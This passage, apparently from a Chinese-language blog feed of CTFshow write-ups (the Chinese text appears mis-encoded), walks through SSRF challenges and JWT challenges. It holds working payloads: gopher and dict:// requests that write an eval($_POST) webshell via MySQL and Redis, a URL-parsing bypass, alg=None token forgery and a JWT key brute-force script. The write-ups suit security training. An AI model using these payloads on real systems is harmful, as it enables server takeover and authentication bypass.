class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br>'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> scheme</code></pre><ol><li><code>$ip = gethostbyname($x[&#39;host&#39;]);</code>ï¼šä½¿ç”¨<code>gethostbyname</code>å‡½æ•°è·å–URLä¸»æœºåå¯¹åº”çš„IPåœ°å€ã€‚</li><li><code>if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</code>ï¼šä½¿ç”¨<code>filter_var</code>å‡½æ•°å’Œç›¸åº”çš„è¿‡æ»¤å™¨æ£€æŸ¥IPåœ°å€æ˜¯å¦æœ‰æ•ˆï¼Œå¹¶ä¸”ä¸æ˜¯ç§æœ‰åœ°å€æˆ–ä¿ç•™åœ°å€ã€‚å¦‚æœIPåœ°å€æ— æ•ˆï¼Œå°†æ‰§è¡Œ<code>die(&#39;ip!&#39;);</code>ç»ˆæ­¢è„šæœ¬æ‰§è¡Œã€‚</li></ol><ul><li><code>filter_var</code>ï¼šè¿™æ˜¯PHPå†…ç½®çš„å‡½æ•°ï¼Œç”¨äºè¿‡æ»¤å˜é‡å¹¶è¿›è¡ŒéªŒè¯ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªæ˜¯è¦éªŒè¯çš„å˜é‡ï¼Œç¬¬äºŒä¸ªæ˜¯è¿‡æ»¤é€‰é¡¹ã€‚</li><li><code>FILTER_VALIDATE_IP</code>ï¼šè¿™æ˜¯ä¸€ä¸ªç”¨äº <code>filter_var</code> çš„é€‰é¡¹ï¼Œç”¨æ¥éªŒè¯æä¾›çš„å˜é‡æ˜¯å¦æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„IPåœ°å€ã€‚</li><li><code>FILTER_FLAG_NO_PRIV_RANGE</code>ï¼šè¿™æ˜¯ä¸€ä¸ªå¯é€‰çš„æ ‡å¿—ï¼Œç”¨æ¥æ’é™¤ç§æœ‰IPåœ°å€èŒƒå›´ã€‚ç§æœ‰IPåœ°å€é€šå¸¸ç”¨äºå†…éƒ¨ç½‘ç»œï¼Œå¹¶ä¸åœ¨äº’è”ç½‘ä¸Šè·¯ç”±ã€‚è¿™äº›åœ°å€åŒ…æ‹¬ä»¥ä¸‹èŒƒå›´ï¼š</li><li><ul><li><code>10.0.0.0</code> åˆ° <code>10.255.255.255</code></li><li><code>172.16.0.0</code> åˆ° <code>172.31.255.255</code></li><li><code>192.168.0.0</code> åˆ° <code>192.168.255.255</code></li></ul></li><li><code>FILTER_FLAG_NO_RES_RANGE</code>ï¼šè¿™æ˜¯å¦ä¸€ä¸ªå¯é€‰çš„æ ‡å¿—ï¼Œç”¨æ¥æ’é™¤ä¿ç•™çš„IPåœ°å€èŒƒå›´ã€‚ä¿ç•™çš„IPåœ°å€é€šå¸¸ä¸åˆ†é…ç»™ç‰¹å®šçš„ç½‘ç»œè®¾å¤‡ï¼Œè€Œç”¨äºç‰¹æ®Šç”¨é€”ï¼Œå¦‚å¤šæ’­åœ°å€ã€‚</li><li><code>$ip</code>ï¼šè¿™æ˜¯è¦éªŒè¯çš„IPåœ°å€å˜é‡ã€‚</li><li><code>if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))</code>ï¼šè¿™æ¡ <code>if</code> è¯­å¥æ£€æŸ¥ <code>$ip</code> æ˜¯å¦é€šè¿‡äº†éªŒè¯ã€‚å¦‚æœ <code>$ip</code> ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„IPåœ°å€ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªç§æœ‰æˆ–ä¿ç•™çš„IPåœ°å€ï¼Œ<code>filter_var</code> å°†è¿”å› <code>false</code>ï¼Œç„¶åæ‰§è¡Œ <code>if</code> è¯­å¥å—å†…çš„ä»£ç ã€‚</li></ul><p>åˆ©ç”¨302è·³è½¬å’Œdnsé‡ç»‘å®šéƒ½å¯ä»¥ã€‚<br>åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šå†™ä¸ªindex.phpæ–‡ä»¶å†…å®¹å¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location:http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>Payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//xxx.xxx.xxx.xx/xxx.php</span></code></pre><h4 id="web358-127-0-0-1"><a href="#web358-127-0-0-1" class="headerlink" title="web358(@127.0.0.1)"></a>web358(@127.0.0.1)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>æ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€æ˜¯ä»¥<a href="http://ctf./">http://ctf.</a>å¼€å¤´ï¼Œä»¥showç»“å°¾ã€‚</p><p>ä»¥showç»“å°¾æ¯”è¾ƒå¥½åŠï¼Œè¦ä¹ˆ#showï¼Œè¦ä¹ˆ?a&#x3D;showè¿™æ ·çš„éƒ½å¯ä»¥ã€‚</p><p>ä»¥<a href="http://ctf.å¼€å¤´çš„è¯ï¼ŒåŠ ä¸Šä¸€ä¸ª@127.0.0.1å°±å¯ä»¥ç»•è¿‡äº†ï¼Œè¿™æ ·parse_urlè§£æå‡ºæ¥çš„hostæ˜¯127.0.0.1ï¼Œè€ƒè™‘åˆ°ftpï¼š">http://ctf.å¼€å¤´çš„è¯ï¼ŒåŠ ä¸Šä¸€ä¸ª@127.0.0.1å°±å¯ä»¥ç»•è¿‡äº†ï¼Œè¿™æ ·parse_urlè§£æå‡ºæ¥çš„hostæ˜¯127.0.0.1ï¼Œè€ƒè™‘åˆ°ftpï¼š</a></p><p><a href="ftp://user[:pass]@ip[:port]/pathï¼Œå› æ­¤å‰é¢çš„ctf.ä¼šè¢«è§£ææˆuserã€‚">ftp://user[:pass]@ip[:port]/pathï¼Œå› æ­¤å‰é¢çš„ctf.ä¼šè¢«è§£ææˆuserã€‚</a></p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//ctf.@127.0.0.1/flag.php#show</span></code></pre><h4 id="web359-mysql-gopherus"><a href="#web359-mysql-gopherus" class="headerlink" title="web359(mysql gopherus)"></a>web359(mysql gopherus)</h4><p>Hint:æ‰“æ— å¯†ç çš„mysql</p><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470">SSRFåˆ©ç”¨ Gopher åè®®æ‹“å±•æ”»å‡»é¢</a></p><p><a href="https://blog.csdn.net/crisprx/article/details/104251284">SSRFåˆ©ç”¨ Gopher |Gopheræ”»å‡»mysqlåŠå†…ç½‘</a></p><p><img src="web359.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%30%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01</span></code></pre><p>æŠŠ<code>_</code>åçš„å†è¿›è¡Œä¸€æ¬¡urlç¼–ç </p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2530%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501</span></code></pre><p>æœ€åè®¿é—®1.phpè¿›è¡ŒRCEå³å¯</p><h4 id="web360-redis"><a href="#web360-redis" class="headerlink" title="web360(redis)"></a>web360(redis)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>ssrfæ‰“redisï¼ŒåŸºæœ¬ä¸Šå››ç§æ”»å‡»æ–¹å¼ï¼š</p><ul><li>å†™webshell</li><li>å†™sshå…¬é’¥</li><li>å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell</li><li>ä¸»ä»å¤åˆ¶</li></ul><p>è¿™é¢˜è‚¯å®šæ˜¯å†™shelläº†ï¼Œå…ˆåˆ©ç”¨dictæ¢æµ‹ä¸€ä¸‹ç«¯å£ï¼Œçœ‹çœ‹6379å­˜ä¸å­˜åœ¨ï¼Œå¦‚æœç›®æ ‡çš„redisæ¢ç«¯å£äº†ï¼Œå°±åˆ©ç”¨dictåè®®æ¥æ¢æµ‹ï¼š</p><p><img src="web360.png" loading="lazy"></p><p><a href="https://xz.aliyun.com/t/5665?time__1311=n4+xni5mqYqQw4CqGNDQTbm2+G8febDBmGoD">æµ…æRedisä¸­SSRFçš„åˆ©ç”¨</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/113853929">CTFshow ssrf</a></p><pre class="language-php" data-language="php"><code class="language-php"># è®¾ç½®ä¸€ä¸‹dirï¼Œå³æœ¬åœ°æ•°æ®åº“å­˜æ”¾ç›®å½•ï¼šdict://127.0.0.1:6379/config:set:dir:/var/www/html# å†™é©¬ï¼Œå¯èƒ½ä¼šæœ‰è½¬ä¹‰æˆ–è€…è¿‡æ»¤çš„æƒ…å†µï¼Œæ‰€ä»¥ç”¨16è¿›åˆ¶ä¸€èˆ¬éƒ½èƒ½å†™æˆåŠŸã€‚# <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>dict://127.0.0.1:6379/set:shell:"\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x30\x5d\x29\x3b\x3f\x3e"# è®¾ç½®æ–‡ä»¶dict://127.0.0.1:6379/config:set:dbfilename:hsad.php# ä¿å­˜dict://127.0.0.1:6379/save# è®¿é—®hsad.phpè¿›è¡Œrce</code></pre><p>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨gopherus</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-JWT</title>
      <link href="/2024/07/27/web%E5%85%A5%E9%97%A8-JWT/"/>
      <url>/2024/07/27/web%E5%85%A5%E9%97%A8-JWT/</url>
      
        <content type="html"><![CDATA[<h3 id="JWTæµ…æ"><a href="#JWTæµ…æ" class="headerlink" title="JWTæµ…æ"></a>JWTæµ…æ</h3><p>JWTå³JSON WEB TOKENï¼Œç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼Œå¹¶ç”¨ä¸¤ä¸ªâ€œ.â€è¿›è¡Œè¿æ¥ã€‚ç¬¬ä¸€éƒ¨åˆ†ä¸ºheaderï¼ˆbase64åŠ å¯†ï¼‰ï¼Œç¬¬äºŒéƒ¨åˆ†ä¸ºpayloadï¼ˆbase64åŠ å¯†ï¼‰ï¼Œç¬¬ä¸‰éƒ¨åˆ†ä¸ºverify signatureï¼Œå®ƒçš„æ„æˆå¦‚ä¸‹ï¼š</p><p><img src="begin.png" loading="lazy"></p><p>HEADERä¸­algå¯¹åº”çš„åŠ å¯†æ–¹å¼ä¸ºHS256ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©å…¶ä»–å¯¹ç§°æˆ–éå¯¹ç§°çš„åŠ å¯†æ–¹å¼ï¼Œå¤§åŒå°å¼‚ã€‚</p><p>PAYLOADä¸­ä¸€èˆ¬åŒ…æ‹¬ç”¨æˆ·ä¿¡æ¯ã€‚</p><p>Verify Signatureä¸­åŒ…æ‹¬åŠ å¯†çš„å¯†ç ã€‚</p><p>JWTæœ¬è´¨ä¸Šæ˜¯ä¸€ç§æ ¡éªŒå€¼ï¼Œç”¨æ¥éªŒè¯èº«ä»½å’Œæ•°æ®æ˜¯å¦è¢«æ›´æ”¹ã€‚</p><h3 id="web345-350"><a href="#web345-350" class="headerlink" title="web345-350"></a>web345-350</h3><h4 id="web345-none"><a href="#web345-none" class="headerlink" title="web345(none)"></a>web345(none)</h4><p>æŸ¥çœ‹æºç å¾—åˆ°Hint<code>/admin</code></p><p>è®¿é—®åæŠ“åŒ…çœ‹åˆ°cookie</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjIwNTgwNTksImV4cCI6MTcyMjA2NTI1OSwibmJmIjoxNzIyMDU4MDU5LCJzdWIiOiJ1c2VyIiwianRpIjoiMzQ4NWJkNjFmY2MwZjFhNjY4NDNhYzlhYTBhMzZjNzEifV0</span></span></code></pre><p>ç”¨<code>.</code>å°†å…¶åˆ†ä¸ºä¸¤åŠåˆ†åˆ«base64è§£ç </p><pre class="language-php" data-language="php"><code class="language-php">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0 <span class="token operator">--</span><span class="token operator">></span>  <span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"alg"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"None"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"typ"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"jwt"</span><span class="token punctuation">&#125;</span>W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjIwNTgwNTksImV4cCI6MTcyMjA2NTI1OSwibmJmIjoxNzIyMDU4MDU5LCJzdWIiOiJ1c2VyIiwianRpIjoiMzQ4NWJkNjFmY2MwZjFhNjY4NDNhYzlhYTBhMzZjNzEifV0  <span class="token operator">--</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"iss"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"iat"</span><span class="token punctuation">:</span><span class="token number">1722058059</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"exp"</span><span class="token punctuation">:</span><span class="token number">1722065259</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"nbf"</span><span class="token punctuation">:</span><span class="token number">1722058059</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sub"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jti"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"3485bd61fcc0f1a66843ac9aa0a36c71"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span></code></pre><p>ç„¶åå°†ååŠéƒ¨åˆ†æ”¹ä¸º<code>[&#123;&quot;sub&quot;:&quot;admin&quot;&#125;]</code>base64ç¼–ç åä¸ç¬¬ä¸€éƒ¨åˆ†æ‹¼æ¥</p><pre class="language-http" data-language="http"><code class="language-http">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0A.W3sic3ViIjoiYWRtaW4ifV0</code></pre><p>å‘é€å¾—åˆ°flag</p><h4 id="web346-348-HS256"><a href="#web346-348-HS256" class="headerlink" title="web346-348(HS256)"></a>web346-348(HS256)</h4><p>è¿™æ¬¡ä½¿ç”¨äº†HS256åŠ å¯†ï¼Œä¸»è¦å°±æ˜¯çˆ†ç ´keyï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯<a href="https://github.com/Aiyflowers/JWT_GUI">JWT_GUI</a></p><p><img src="web346.png" loading="lazy"></p><pre class="language-http" data-language="http"><code class="language-http">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcyMjA2MjAzMSwiZXhwIjoxNzIyMDY5MjMxLCJuYmYiOjE3MjIwNjIwMzEsInN1YiI6ImFkbWluIiwianRpIjoiNjUwZWVkZWVjNDAwYTA2ZTAxNWM1NjUzOWNkMmY5MTAifQ.Q2JT2tqgC8JogIjUH6PNNQN3_MY3QmDp8LK6aBj7Pfs</code></pre><p>è¿™é‡Œä¹Ÿæœ‰pyçˆ†ç ´è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">python <span class="token punctuation">.</span><span class="token operator">/</span>pydictor<span class="token punctuation">.</span>py <span class="token operator">-</span>base d <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">len</span> <span class="token number">1</span> <span class="token number">6</span> <span class="token operator">-</span>o nums1_6<span class="token punctuation">.</span>txt</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">runblasting</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>jwt_str<span class="token punctuation">,</span>alg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> alg <span class="token operator">==</span> <span class="token string">"none"</span><span class="token punctuation">:</span>        alg <span class="token operator">=</span> <span class="token string">"HS256"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            key_ <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'use '</span><span class="token operator">+</span>key_<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jwt_str<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>key<span class="token operator">=</span>key_<span class="token punctuation">,</span>algorithms<span class="token operator">=</span>alg<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'found key! -->'</span> <span class="token operator">+</span> key_<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">,</span> jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidAudienceError<span class="token punctuation">,</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidIssuedAtError<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'found key! -->'</span> <span class="token operator">+</span> key_<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidSignatureError<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"key not found!"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> <span class="token string">'./nums1_6.txt'</span>    jwt_str <span class="token operator">=</span> <span class="token string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMjY2NzAxMywiZXhwIjoxNjMyNjc0MjEzLCJuYmYiOjE2MzI2NjcwMTMsInN1YiI6InVzZXIiLCJqdGkiOiIyNzM3NjJhOWU1NjZhMmIzNDJhYjUxN2VjNDNiOWY5YSJ9.4sf78nrf_g84F9m0Bpgbvn8fC1YkECCFZPd5U9tULYg"</span>    alg <span class="token operator">=</span> <span class="token string">'HS256'</span>    runblasting<span class="token punctuation">(</span>path<span class="token punctuation">,</span>jwt_str<span class="token punctuation">,</span>alg<span class="token punctuation">)</span></code></pre><p>348 key : aabb</p><h4 id="web349-RS256"><a href="#web349-RS256" class="headerlink" title="web349(RS256)"></a>web349(RS256)</h4><p>Hint:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// app.js</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> privateKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'//public//private.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> <span class="token string">'user'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'RS256'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">,</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res<span class="token punctuation">,</span>next</span><span class="token 